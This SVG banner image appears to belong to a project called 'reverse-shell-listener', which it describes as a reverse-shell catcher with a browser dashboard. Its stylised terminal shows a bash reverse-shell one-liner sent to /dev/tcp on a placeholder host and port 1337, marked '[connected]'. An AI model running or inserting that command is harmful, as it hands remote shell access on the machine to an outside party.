<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 300">
  <defs>
    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#282a36"/>
      <stop offset="100%" style="stop-color:#1a1c24"/>
    </linearGradient>
    <linearGradient id="accent" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" style="stop-color:#bd93f9"/>
      <stop offset="50%" style="stop-color:#ff79c6"/>
      <stop offset="100%" style="stop-color:#8be9fd"/>
    </linearGradient>
    <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="3" result="blur"/>
      <feComposite in="SourceGraphic" in2="blur" operator="over"/>
    </filter>
  </defs>

  <!-- Background -->
  <rect width="800" height="300" fill="url(#bg)" rx="12"/>

  <!-- Decorative grid -->
  <g stroke="#44475a" stroke-width="0.5" opacity="0.3">
    <line x1="0" y1="60" x2="800" y2="60"/>
    <line x1="0" y1="120" x2="800" y2="120"/>
    <line x1="0" y1="180" x2="800" y2="180"/>
    <line x1="0" y1="240" x2="800" y2="240"/>
    <line x1="100" y1="0" x2="100" y2="300"/>
    <line x1="300" y1="0" x2="300" y2="300"/>
    <line x1="500" y1="0" x2="500" y2="300"/>
    <line x1="700" y1="0" x2="700" y2="300"/>
  </g>

  <!-- Left terminal window -->
  <g transform="translate(60, 70)">
    <rect width="220" height="160" fill="#21222c" stroke="#bd93f9" stroke-width="2" rx="8"/>
    <circle cx="20" cy="18" r="5" fill="#ff5555"/>
    <circle cx="38" cy="18" r="5" fill="#f1fa8c"/>
    <circle cx="56" cy="18" r="5" fill="#50fa7b"/>
    <text x="20" y="55" font-family="monospace" font-size="13" fill="#50fa7b">$</text>
    <text x="35" y="55" font-family="monospace" font-size="13" fill="#f8f8f2">bash -i &gt;&amp;</text>
    <text x="20" y="80" font-family="monospace" font-size="13" fill="#f8f8f2">/dev/tcp/host/1337</text>
    <text x="20" y="110" font-family="monospace" font-size="13" fill="#8be9fd">[connected]</text>
    <text x="20" y="135" font-family="monospace" font-size="13" fill="#6272a4">_</text>
  </g>

  <!-- Connection lines -->
  <g stroke="url(#accent)" stroke-width="2" fill="none" opacity="0.8">
    <path d="M280 150 L360 150" stroke-dasharray="6,4"/>
    <path d="M440 150 L520 150" stroke-dasharray="6,4"/>
  </g>

  <!-- Center node: listener -->
  <g transform="translate(360, 110)">
    <rect width="80" height="80" fill="#21222c" stroke="#ff79c6" stroke-width="2" rx="12" filter="url(#glow)"/>
    <text x="40" y="35" text-anchor="middle" font-family="monospace" font-size="11" fill="#ff79c6">RSL</text>
    <text x="40" y="55" text-anchor="middle" font-family="monospace" font-size="10" fill="#f8f8f2">Listener</text>
  </g>

  <!-- Right dashboard window -->
  <g transform="translate(520, 70)">
    <rect width="220" height="160" fill="#21222c" stroke="#8be9fd" stroke-width="2" rx="8"/>
    <circle cx="20" cy="18" r="5" fill="#ff5555"/>
    <circle cx="38" cy="18" r="5" fill="#f1fa8c"/>
    <circle cx="56" cy="18" r="5" fill="#50fa7b"/>
    <text x="20" y="50" font-family="monospace" font-size="13" fill="#bd93f9">Dashboard</text>
    <rect x="20" y="65" width="180" height="12" fill="#44475a" rx="2"/>
    <rect x="20" y="85" width="120" height="10" fill="#6272a4" rx="2"/>
    <rect x="20" y="105" width="160" height="10" fill="#6272a4" rx="2"/>
    <rect x="20" y="130" width="80" height="14" fill="#bd93f9" rx="3"/>
  </g>

  <!-- Title -->
  <text x="400" y="260" text-anchor="middle" font-family="monospace" font-size="28" font-weight="bold" fill="url(#accent)" filter="url(#glow)">reverse-shell-listener</text>
  <text x="400" y="285" text-anchor="middle" font-family="monospace" font-size="12" fill="#6272a4">multi-transport reverse-shell catcher with a browser dashboard</text>
</svg>